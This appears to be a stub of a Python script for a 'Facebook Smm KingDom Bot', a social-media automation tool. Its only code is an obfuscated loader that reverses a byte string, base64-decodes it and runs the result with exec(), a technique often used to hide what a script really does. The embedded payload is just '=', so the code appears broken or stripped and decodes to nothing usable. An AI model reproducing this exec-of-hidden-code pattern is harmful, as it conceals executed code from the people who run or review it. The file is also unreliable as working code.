# Fares Alex
# Facebook Smm KingDom Bot
# Time: Fri Aug 15 19:11:56 2025
# ----------------------------------
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'='))
